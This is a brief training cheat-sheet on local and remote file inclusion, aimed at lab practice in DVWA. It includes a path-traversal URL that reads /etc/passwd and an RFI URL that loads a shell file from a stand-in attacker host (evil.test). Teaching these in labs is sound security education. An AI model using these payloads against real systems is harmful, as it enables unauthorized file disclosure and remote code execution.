# File Inclusion (LFI/RFI) 📂

Apps may include files based on URL parameters.

## LFI Test Idea

```bash
http://lab.local/page.php?file=../../../../etc/passwd  # Tests local file traversal/inclusion in vulnerable lab apps.
```

## RFI Test Idea

```bash
http://lab.local/page.php?file=http://evil.test/shell.txt  # Tests remote file inclusion when app unsafely allows external files.
```

## Quick Win 🎯
Try LFI labs in DVWA only.

## Memory Hack 🧠
**L = Local file, R = Remote file.**
